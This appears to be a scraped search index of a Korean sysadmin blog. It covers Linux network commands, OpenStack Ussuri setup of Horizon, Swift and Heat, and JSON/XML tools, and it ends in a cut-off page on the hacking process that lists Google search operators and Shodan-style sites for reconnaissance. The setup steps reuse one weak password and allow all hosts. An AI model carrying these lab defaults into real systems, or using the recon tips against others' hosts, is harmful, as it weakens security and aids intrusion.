사용합니다.     사용예제 $ scp user@127.0.0.1:/reomote/file/path /local/file/path # 원격 파일 복사  $ scp -r user@127.0.0.1:/reomote/directory/path /local/directory/path # 원격 디렉토리 복사  $ scp /local/file/path user@127.0.0.1:/reomote/file/path # 로컬 파일 복사  $ scp -r /local/directory/path user@127.0.0.1:/reomote/directory/path # 로컬 디렉토리 복사  $ scp user@127.0.0.1:/reomote/file/path user@127.0.0.2:/reomote/file/path     ssh   TELNET과 비슷한 역할을 수행하지만 암호 통신을 이용하여 원격 호스트에 연결하는 명령어입니다.   주요 옵션     옵션 내용     -p 연결할 포트를 지정 기본 22   -i 인증키를 지정   -l 접속하는 사용자 명을 지정   -L 포트 바인딩을 사용   -v 접속 로그를 출력        Telnet   네트워크 호스트와 포트에 연결이 가능한지 확인할 수 있는 기본 명령어입니다.   사용예제  $ telnet 192.168.1.20 80 # 192.168.1.20주소의 80번 포트에 접속  $ telnet host-1 8050 Trying 192.168.0.1... Connected to host-1 Escape character is \u0026#39;^]\u0026#39;. # host-1에 연결. 연결 성공  Trying 10.202.52.63... telnet: connect to address 192.168.0.2: Connection refused # host-2에 연결. 연결 실패  # telnet host-2 8050     wget   웹 상의 파일을 다운로드 하는 명령어 입니다.   주요 옵션     옵션 내용     -O 파일의 저장위치를 설정     "}),a.add({id:214,href:'/docs/openstack/openstacktraining/openstack-ussuri-08/',title:"OpenStack Ussuri : Horizon",content:"OpenStack : Horizon  OpenStack : Horizon   Horizon은 openstack에서 GUI 환경을 제공해주는 서비스입니다. Horizon에 대한 자세한 설명은 Horizon을 참조해주세요.   $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-dashboard $ controller\u0026gt; vi /etc/openstack-dashboard/local_settings ALLOWED_HOSTS = [\u0026#39;*\u0026#39;,\u0026#39;\u0026#39;] # 모든 host의 접속이 가능하게 설정합니다. CACHES = { \u0026#39;default\u0026#39;: { \u0026#39;BACKEND\u0026#39;: \u0026#39;django.core.cache.backends.memcached.MemcachedCache\u0026#39;, \u0026#39;LOCATION\u0026#39;: \u0026#39;controller:11211\u0026#39;, }, } SESSION_ENGINE = \u0026#34;django.contrib.sessions.backends.cache\u0026#34; OPENSTACK_HOST = \u0026#34;controller\u0026#34; OPENSTACK_KEYSTONE_URL = \u0026#34;http://controller:5000/v3\u0026#34; # openstack host와 SESSION 서버의 host를 지정합니다. TIME_ZONE = \u0026#34;Asia/Seoul\u0026#34; # 시간을 지정합니다. WEBROOT = \u0026#39;/dashboard/\u0026#39; LOGIN_URL = \u0026#39;/dashboard/auth/login/\u0026#39; LOGOUT_URL = \u0026#39;/dashboard/auth/logout/\u0026#39; LOGIN_REDIRECT_URL = \u0026#39;/dashboard/\u0026#39; OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = \u0026#39;Default\u0026#39; OPENSTACK_API_VERSIONS = { \u0026#34;identity\u0026#34;: 3, \u0026#34;volume\u0026#34;: 3, \u0026#34;compute\u0026#34;: 2, } # 끝에 추가합니다. $ controller\u0026gt; vi /etc/httpd/conf.d/openstack-dashboard.conf .... .... WSGIApplicationGroup %{GLOBAL} # 상단에 추가합니다. $ controller\u0026gt; systemctl restart httpd # httpd를 재 시작합니다. $ controller\u0026gt; setsebool -P httpd_can_network_connect on $ controller\u0026gt; firewall-cmd --add-service={http,https} --permanent $ controller\u0026gt; firewall-cmd --reload # SELinux 및 방화벽을 설정합니다.    확인   접속확인  http://[ controller의 IP ]/dashboard/ "}),a.add({id:215,href:'/docs/openstack/openstacktraining/openstack-ussuri-09/',title:"OpenStack Ussuri : Swift",content:" OpenStack Ussuri : Swift  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | ----------------------- | metadata agent | ----------------------- | Neutron Server | ----------------------- --------------------------------- | [ Storage Node 1, 2, 3 ] | | | | Swift-account-auditor | | Swift-account-replicator | | Swift-account | | Swift-container-auditor | | Swift-container-replicator | | Swift-container-updater | | Swift-container | | Swift-object-auditor | | Swift-object-replicator | | Swift-object-updater | | Swift-swift-object | ---------------------------------  OpenStack Ussuri : Swift   Swift는 우리가 흔히 사용하는 네이버 클라우드, 구글 드라이브와 같은 오브젝트 스토리지 서비스 입니다. Swift 설치는 network, Storage 순으로 이루어집니다. Swift*에 대한 설명은 Swift을 참조해주세요.     $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 swift +--------------------------------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | dd2f0225406249b195e4feff91eca393 | | name | swift | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user swift admin $ controller ~(keystone)\u0026gt; openstack service create --name swift --description \u0026#34;OpenStack Object Storage\u0026#34; object-store +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Object Storage | | enabled | True | | id | d9d7bc4b99774d3ba701e2eae93edfe2 | | name | swift | | type | object-store | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne object-store public http://network:8080/v1/AUTH_%\\(tenant_id\\)s +--------------+------------------------------------+ | Field | Value | +--------------+------------------------------------+ | enabled | True | | id | a70e1ac16a9144529ea49132cd7dd39e | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | d9d7bc4b99774d3ba701e2eae93edfe2 | | service_name | swift | | service_type | object-store | | url | http://network:8080/v1/AUTH_%(tenant_id)s | +--------------+------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne object-store internal http://network:8080/v1/AUTH_%\\(tenant_id\\)s +--------------+------------------------------------+ | Field | Value | +--------------+------------------------------------+ | enabled | True | | id | 6b5ea7b028f94035aef5601cf35d3a29 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | d9d7bc4b99774d3ba701e2eae93edfe2 | | service_name | swift | | service_type | object-store | | url | http://network:8080/v1/AUTH_%(tenant_id)s | +--------------+------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne object-store admin http://network:8080/v1 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 08c18a5313f642d59de980f51666f830 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | d9d7bc4b99774d3ba701e2eae93edfe2 | | service_name | swift | | service_type | object-store | | url | http://network:8080/v1 | +--------------+----------------------------------+    Network Node Swift-Proxy 설치   $ network\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-swift-proxy python3-memcached openssh-clients # swift-proxy 및 관련 모듈을 설치합니다. $ network\u0026gt; vi /etc/swift/proxy-server.conf [filter:cache] use = egg:swift#memcache memcache_servers = controller:11211 [filter:authtoken] paste.filter_factory = keystonemiddleware.auth_token:filter_factory # admin_tenant_name = %SERVICE_TENANT_NAME% # admin_user = %SERVICE_USER% # admin_password = %SERVICE_PASSWORD% # auth_host = 127.0.0.1 # auth_port = 35357 # auth_protocol = http # signing_dir = /tmp/keystone-signing-swift # 주석처리 후, 하단의 아래의 항모들을 추가합니다.합니다. www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = swift password = qwer1234 delay_auth_decision = true $ network\u0026gt; vi /etc/swift/swift.conf [swift-hash] swift_hash_path_suffix = swift_shared_path swift_hash_path_prefix = swift_shared_path # 파일 안에 내용들을 삭제 후, 생성합니다. $ network\u0026gt; swift-ring-builder /etc/swift/account.builder create 12 3 1 $ network\u0026gt; swift-ring-builder /etc/swift/container.builder create 12 3 1 $ network\u0026gt; swift-ring-builder /etc/swift/object.builder create 12 3 1 $ network\u0026gt; swift-ring-builder /etc/swift/account.builder add r0z0-10.10.10.50:6202/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/container.builder add r0z0-10.10.10.50:6201/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/object.builder add r0z0-10.10.10.50:6200/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/account.builder add r1z1-10.10.10.51:6202/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/container.builder add r1z1-10.10.10.51:6201/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/object.builder add r1z1-10.10.10.51:6200/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/account.builder add r2z2-10.10.10.52:6202/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/container.builder add r2z2-10.10.10.52:6201/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/object.builder add r2z2-10.10.10.52:6200/device 100 $ network\u0026gt; swift-ring-builder /etc/swift/account.builder rebalance $ network\u0026gt; swift-ring-builder /etc/swift/container.builder rebalance $ network\u0026gt; swift-ring-builder /etc/swift/object.builder rebalance $ network\u0026gt; chown swift. /etc/swift/*.gz $ network\u0026gt; systemctl enable --now openstack-swift-proxy $ network\u0026gt; firewall-cmd --add-port=8080/tcp --permanent $ network\u0026gt; firewall-cmd --reload    Swift Stoage Node 설치  $ storage all\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-swift-account openstack-swift-container openstack-swift-object openstack-selinux xfsprogs rsync rsync-daemon openssh-clients # swift 밒 관련 모듈을 설치합니다. $ storage all\u0026gt; mkfs.xfs -i size=1024 -s size=4096 /dev/sdb1 $ storage all\u0026gt; mkdir -p /srv/node/device $ storage all\u0026gt; mount -o noatime,nodiratime /dev/sdb1 /srv/node/device $ storage all\u0026gt; chown -R swift. /srv/node # 하드 디스크를 임포트 후, XFS로 포맷을 진행합니다. $ storage all\u0026gt; vi /etc/fstab /dev/sdb1 /srv/node/device xfs noatime,nodiratime 0 0 # 설정을 fstab의 등록합니다. $ network\u0026gt; scp /etc/swift/*.gz storage1:/etc/swift/ $ network\u0026gt; scp /etc/swift/*.gz storage2:/etc/swift/ $ network\u0026gt; scp /etc/swift/*.gz storage3:/etc/swift/ # 설정을 복사합니다. $ storage all\u0026gt; chown swift. /etc/swift/*.gz $ storage all\u0026gt; vi /etc/swift/swift.conf [swift-hash] swift_hash_path_suffix = swift_shared_path swift_hash_path_prefix = swift_shared_path $ storage all\u0026gt; vi /etc/swift/account-server.conf bind_ip = 0.0.0.0 bind_port = 6202 $ storage all\u0026gt; vi /etc/swift/container-server.conf bind_ip = 0.0.0.0 bind_port = 6201 $ storage all\u0026gt; vi /etc/swift/object-server.conf bind_ip = 0.0.0.0 bind_port = 6200 $ storage all\u0026gt; vi /etc/rsyncd.conf pid file = /var/run/rsyncd.pid log file = /var/log/rsyncd.log uid = swift gid = swift pid file = /var/run/rsyncd.pid log file = /var/log/rsyncd.log uid = swift gid = swift address = storage1 or storage2 or storage3 [account] path = /srv/node read only = false write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 25 lock file = /var/lock/account.lock [container] path = /srv/node read only = false write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 25 lock file = /var/lock/container.lock [object] path = /srv/node read only = false write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 25 lock file = /var/lock/object.lock [swift_server] path = /etc/swift read only = true write only = no list = yes incoming chmod = 0644 outgoing chmod = 0644 max connections = 5 lock file = /var/lock/swift_server.lock $ storage all\u0026gt; semanage fcontext -a -t swift_data_t /srv/node/device $ storage all\u0026gt; restorecon /srv/node/device $ storage all\u0026gt; firewall-cmd --add-port={873/tcp,6200/tcp,6201/tcp,6202/tcp} --permanent $ storage all\u0026gt; firewall-cmd --reload # SELinux 및 방화벽을 설정합니다. $ storage all\u0026gt; systemctl enable --now rsyncd \\ openstack-swift-account-auditor \\ openstack-swift-account-replicator \\ openstack-swift-account \\ openstack-swift-container-auditor \\ openstack-swift-container-replicator \\ openstack-swift-container-updater \\ openstack-swift-container \\ openstack-swift-object-auditor \\ openstack-swift-object-replicator \\ openstack-swift-object-updater \\ openstack-swift-object # swift 서비스를 등록 및 시작합니다.    확인  $ controller ~(keystone)\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install python3-openstackclient python3-keystoneclient python3-swiftclient # swift 사용을 위해 관련 모듈을 설치합니다. $ controller ~(keystone)\u0026gt; openstack project create --domain default --description \u0026#34;Swift Service Project\u0026#34; swiftservice +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Swift Service Project | | domain_id | default | | enabled | True | | id | ab658f35464e49b7a3df626e09feab91 | | is_domain | False | | name | swiftservice | | options | {} | | parent_id | default | | tags | [] | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role create SwiftOperator +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | None | | domain_id | None | | id | 3818d26e54244c1ba5d0481e9ad44e6e | | name | SwiftOperator | | options | {} | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack user create --domain default --project swiftservice --password qwer1234 swiftuser01 +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | ab658f35464e49b7a3df626e09feab91 | | domain_id | default | | enabled | True | | id | 2ac2c69fd55a4bef95b2a8b728f131a7 | | name | swiftuser01 | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project swiftservice --user swiftuser01 SwiftOperator $ controller ~(keystone)\u0026gt; vi ~/swift export OS_PROJECT_DOMAIN_NAME=default export OS_USER_DOMAIN_NAME=default export OS_PROJECT_NAME=swiftservice export OS_USERNAME=swiftuser01 export OS_PASSWORD=qwer1234 export OS_AUTH_URL=http://controller:5000/v3 export OS_IDENTITY_API_VERSION=3 export PS1=\u0026#39;[\\u@\\h \\W(swift)]\\$ \u0026#39; $ controller ~(keystone)\u0026gt; chmod 600 ~/swift $ controller ~(keystone)\u0026gt; source ~/swift $ controller ~(keystone)\u0026gt; echo \u0026#34;source ~/swift \u0026#34; \u0026gt;\u0026gt; ~/.bash_profile $ controller ~(swift)\u0026gt; swift stat Account: AUTH_ab658f35464e49b7a3df626e09feab91 Containers: 0 Objects: 0 Bytes: 0 Content-Type: text/plain; charset=utf-8 X-Timestamp: 1597360203.35834 X-Put-Timestamp: 1597360203.35834 Vary: Accept X-Trans-Id: tx09982b0a02ac4b7eac244-005f35c849 X-Openstack-Request-Id: tx09982b0a02ac4b7eac244-005f35c849 $ controller ~(swift)\u0026gt; openstack container create test +---------------------------------------+-----------+------------------------------------+ | account | container | x-trans-id | +---------------------------------------+-----------+------------------------------------+ | AUTH_ab658f35464e49b7a3df626e09feab91 | test | txce00712612794927965f7-005f35c864 | +---------------------------------------+-----------+------------------------------------+ $ controller ~(swift)\u0026gt; openstack container list +------+ | Name | +------+ | test | +------+ $ controller ~(swift)\u0026gt; openstack object create testfile.txt test $ controller ~(swift)\u0026gt; openstack object list test $ controller ~(swift)\u0026gt; rm testfile.txt $ controller ~(swift)\u0026gt; openstack object save test testfile.txt $ controller ~(swift)\u0026gt; ll testfile.txt $ controller ~(swift)\u0026gt; openstack object delete test testfile.txt $ controller ~(swift)\u0026gt; openstack object list test   "}),a.add({id:216,href:'/docs/system/linux/linux08/',title:"Linux 형식파일",content:"Linux   Linux 형식파일   Linux 형식파일은 xml, xmllint, json, jq 형식의 파일들을 처리하기 위한 명령어입니다..      jq   jq는 JSON 형식 파일을 포맷과 들여쓰기에 맞게 출력하고, xpath 형식으로 값을 확인할 수 있습니다.   사용예제  $ echo \u0026#39;{\u0026#34;key1\u0026#34;:\u0026#34;val1\u0026#34;, \u0026#34;key2\u0026#34;:\u0026#34;val2\u0026#34;}\u0026#39; {\u0026#34;key1\u0026#34;:\u0026#34;val1\u0026#34;, \u0026#34;key2\u0026#34;:\u0026#34;val2\u0026#34;} $ echo \u0026#39;{\u0026#34;key1\u0026#34;:\u0026#34;val1\u0026#34;, \u0026#34;key2\u0026#34;:\u0026#34;val2\u0026#34;}\u0026#39; | jq { \u0026#34;key1\u0026#34;: \u0026#34;val1\u0026#34;, \u0026#34;key2\u0026#34;: \u0026#34;val2\u0026#34; } # jq를 이용하면 JSON 형식의 문자열을 포맷에 맞게 출력  $ echo \u0026#39;{\u0026#34;key1\u0026#34;:\u0026#34;val1\u0026#34;, \u0026#34;key2\u0026#34;:\u0026#34;val2\u0026#34;}\u0026#39; | jq \u0026#39;.key1\u0026#39; \u0026#34;val1\u0026#34; # xpath 형식으로 값 확인      xmllint   xml 파일의 문법을 확인, xpath를 이용한 데이터 추출이 가능한 명령어입니다.   주요 옵션     옵션 내용     \u0026ndash;foramt xml 문서의 출력을 포맷에 맞춰 처리   \u0026ndash;valid xml 문서가 DTD에 맞는지를 확인   \u0026ndash;xpath xpath 문법에 맞게 데이터를 출력     사용예제  $ echo \u0026#34;\u0026lt;xml\u0026gt;\u0026lt;key\u0026gt;A\u0026lt;/key\u0026gt;\u0026lt;value\u0026gt;B\u0026lt;/value\u0026gt;\u0026lt;/xml\u0026gt;\u0026#34; | xmllint --format - \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;xml\u0026gt; \u0026lt;key\u0026gt;A\u0026lt;/key\u0026gt; \u0026lt;value\u0026gt;B\u0026lt;/value\u0026gt; \u0026lt;/xml\u0026gt; # 포맷에 맞게 출력 $ xmllint --format sample.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;xml\u0026gt; \u0026lt;key\u0026gt;A\u0026lt;/key\u0026gt; \u0026lt;value\u0026gt;B\u0026lt;/value\u0026gt; \u0026lt;/xml\u0026gt; # sample.xml 파일을 포맷에 맞게 처리  $ xmllint --valid sample.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;xml\u0026gt; \u0026lt;key\u0026gt;A\u0026lt;/key\u0026gt; \u0026lt;value\u0026gt;B\u0026lt;/value\u0026gt; \u0026lt;/xml\u0026gt; # sample.xml 이 DTD 에 맞는지 확인  $ xmllint --xpath \u0026#34;xml/key\u0026#34; sample.xml \u0026lt;key\u0026gt;A\u0026lt;/key\u0026gt;  "}),a.add({id:217,href:'/docs/openstack/openstacktraining/openstack-ussuri-10/',title:"OpenStack Ussuri : Heat",content:"OpenStack Ussuri : Heat  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | ----------------------- | API-CFN | | Neutron Server | | Heat Engine | ----------------------- ----------------------- --------------------------------- | [ Storage Node 1, 2, 3 ] | | | | Swift-account-auditor | | Swift-account-replicator | | Swift-account | | Swift-container-auditor | | Swift-container-replicator | | Swift-container-updater | | Swift-container | | Swift-object-auditor | | Swift-object-replicator | | Swift-object-updater | | Swift-swift-object | ---------------------------------  OpenStack Ussuri : Heat   클라우딩 컴퓨팅이 꽃인 Orchestaration 기능을 수행하는 Heat 서비스를 설치해보도록 하겠습니다. Heat 설치는 controller, network 노드 순으로 이루어집니다. 단 Heat는 controller에서는 API의 Endpoint만을 제공하며, 대부분의 설정은 network node에서 이루어집니다. Heat*에 대한 설명은 Heat을 참조해주세요.     Heat service 및 User 생성 $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 heat +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | 148bafa480d84f87ba939968edb2585f | | name | heat | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user heat admin $ controller ~(keystone)\u0026gt; openstack role create heat_stack_owner +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | None | | domain_id | None | | id | d46789e4326e4055aa8f6fead7c777bb | | name | heat_stack_owner | | options | {} | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role create heat_stack_user +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | None | | domain_id | None | | id | ff45744ddbe247919034cea7c3f309e7 | | name | heat_stack_user | | options | {} | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project admin --user admin heat_stack_owner $ controller ~(keystone)\u0026gt; openstack service create --name heat --description \u0026#34;Openstack Orchestration\u0026#34; orchestration +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Openstack Orchestration | | enabled | True | | id | 6cd5b7c7a3234b39998073587c2d9f9a | | name | heat | | type | orchestration | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack service create --name heat-cfn --description \u0026#34;Openstack Orchestration\u0026#34; cloudformation +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Openstack Orchestration | | enabled | True | | id | 2fb2087bf8da472d8c51e9fee39c93ad | | name | heat-cfn | | type | cloudformation | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne orchestration public http://network:8004/v1/AUTH_%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | 50481bc9998b454a9f70682132ecb026 | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 6cd5b7c7a3234b39998073587c2d9f9a | | service_name | heat | | service_type | orchestration | | url | http://network:8004/v1/AUTH_%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne orchestration internal http://network:8004/v1/AUTH_%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | 1015f4c570a747349109b76b7295876c | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 6cd5b7c7a3234b39998073587c2d9f9a | | service_name | heat | | service_type | orchestration | | url | http://network:8004/v1/AUTH_%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne orchestration admin http://network:8004/v1/AUTH_%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | ed21251a3f274ba6bb35061cef6cac1d | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 6cd5b7c7a3234b39998073587c2d9f9a | | service_name | heat | | service_type | orchestration | | url | http://network:8004/v1/AUTH_%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne cloudformation public http://network:8000/v1 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | fb2b67b2a13d43e1a55f775857908a5f | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 2fb2087bf8da472d8c51e9fee39c93ad | | service_name | heat-cfn | | service_type | cloudformation | | url | http://network:8000/v1 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne cloudformation internal http://network:8000/v1 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | a8f4517ecf4d4370beecee9e17183c6b | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 2fb2087bf8da472d8c51e9fee39c93ad | | service_name | heat-cfn | | service_type | cloudformation | | url | http://network:8000/v1 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne cloudformation admin http://network:8000/v1 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 66db714e538545879b7121f7150e72fc | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 2fb2087bf8da472d8c51e9fee39c93ad | | service_name | heat-cfn | | service_type | cloudformation | | url | http://network:8000/v1 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack domain create --description \u0026#34;Stack projects and users\u0026#34; heat +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Stack projects and users | | enabled | True | | id | 36fa9838b2fa43f6a6bbc95f0cdfd0a7 | | name | heat | | options | {} | | tags | [] | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack user create --domain heat --password qwer1234 heat_domain_admin +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | domain_id | 36fa9838b2fa43f6a6bbc95f0cdfd0a7 | | enabled | True | | id | c77bd90604254f8097aed49ea17f6fb3 | | name | heat_domain_admin | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --domain heat --user heat_domain_admin admin       Heat 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database heat; $ MariaDB\u0026gt; grant all privileges on heat.* to heat@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on heat.* to heat@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Network Node Heat 설치  $ Network\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-heat-api openstack-heat-api-cfn openstack-heat-engine python3-heatclient # Heat 및 관련 모듈을 설치합니다. $ Network\u0026gt; vi /etc/heat/heat.conf [DEFAULT] deferred_auth_method = trusts trusts_delegated_roles = heat_stack_owner heat_metadata_server_url = http://network:8000 heat_waitcondition_server_url = http://network:8000/v1/waitcondition heat_watch_server_url = http://network:8003 heat_stack_user_role = heat_stack_user stack_user_domain_name = heat stack_domain_admin = heat_domain_admin stack_domain_admin_password = qwer1234 transport_url = rabbit://openstack:qwer1234@controller [database] connection = mysql+pymysql://heat:qwer1234@controller/heat [clients_keystone] auth_uri = http://controller:5000 [ec2authtoken] auth_uri = http://controller:5000 [heat_api] bind_host = 0.0.0.0 bind_port = 8004 [heat_api_cfn] bind_host = 0.0.0.0 bind_port = 8000 [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = heat password = qwer1234 [trustee] auth_plugin = password auth_url = http://controller:5000 username = heat password = qwer1234 user_domain_name = default $ network\u0026gt; chgrp heat /etc/heat/heat.conf $ network\u0026gt; chmod 640 /etc/heat/heat.conf $ network\u0026gt; su -s /bin/bash heat -c \u0026#34;heat-manage db_sync\u0026#34; $ network\u0026gt; systemctl enable --now openstack-heat-api openstack-heat-api-cfn openstack-heat-engine # DB를 import 시키고, haet 서비스를 등록 및 시작합니다. $ network\u0026gt; firewall-cmd --add-port={8000/tcp,8004/tcp} --permanent $ network\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다.    확인  $ controller ~(keystone)\u0026gt; vi sample-stack.yml heat_template_version: 2018-08-31 description: Heat Sample Template parameters: ImageID: type: string description: Image used to boot a server NetID: type: string description: Network ID for the server resources: server1: type: OS::Nova::Server properties: name: \u0026#34;Heat_Deployed_Server\u0026#34; image: { get_param: ImageID } flavor: \u0026#34;m1.tiny\u0026#34; networks: - network: { get_param: NetID } outputs: server1_private_ip: description: IP address of the server in the private network value: { get_attr: [ server1, first_address ] } $ controller ~(keystone)\u0026gt; openstack stack create -t sample-stack.yml --parameter \u0026#34;ImageID=cirros;NetID=Int_net\u0026#34; Sample-Stack # controller ~(keystone)\u0026gt; openstack stack list +--------------------------------------+--------------+----------------------------------+-----------------+----------------------+--------------+ | ID | Stack Name | Project | Stack Status | Creation Time | Updated Time | +--------------------------------------+--------------+----------------------------------+-----------------+----------------------+--------------+ | 4cb88c32-24f9-41cf-a44d-e18593c5eb2f | Sample-Stack | edd7025c02574d3aa2d3ab6e56208320 | CREATE_COMPLETE | 2020-08-13T09:39:16Z | None | +--------------------------------------+---- # controller ~(keystone)\u0026gt; openstack server list +--------------------------------------+----------------------+--------+-----------------------+--------+---------+ | ID | Name | Status | Networks | Image | Flavor | +--------------------------------------+----------------------+--------+-----------------------+--------+---------+ | ab20d06c-955a-404b-9525-11e3e4b09484 | Heat_Deployed_Server | ACTIVE | int_net=192.168.100.6 | cirros | m1.tiny | +--------------------------------------+----------------------+--------+-----------------------+--------+---------+   "}),a.add({id:218,href:'/docs/network/network/security/',title:"Network Security",content:"Network Security   Hacking Process  확인 정보 ( OS 버전, 응용 프로그램, IP주소, 도메인 )  정보수집  \r정보 수집\r...\r\r  구글 검색    intitle : [검색어] - 탭 제목에 포함된 내용으로 검색\n  filetype : [검색어] - 특정 파일 확장자로 검색\n  site : [검색어] - 특정 도메인 주소 검색\n  inurl : [검색어] - URL에 포함된 문자 검색\n  홈페이지 이용\n    www.news.netcraft.com \u0026ndash;\u0026gt; Internet Data Mining \u0026ndash;\u0026gt; Hosting Provider Analysis\n  오른쪽에 정보를 수집하고 싶은 도메인 입력\n  서버의 OS 정보, 웹 서버 정보, IP 등 확인 가능\n  www.archive.org: 특정 도메인의 업데이트 내역 기록 ( 옛 사이트도 접속 가능 )\n  www.zone-h.org: 취약점이 존재하는 홈페이지 기록\n  www.shodan.io/: 특정 네트워크 장비, 네트워크를 찾음\n  \r\r\r  취약점 확인  \r네트워크 패킷을 이용한 해킹\r...\r\r네트워크 패킷을 이용한 해킹 포트 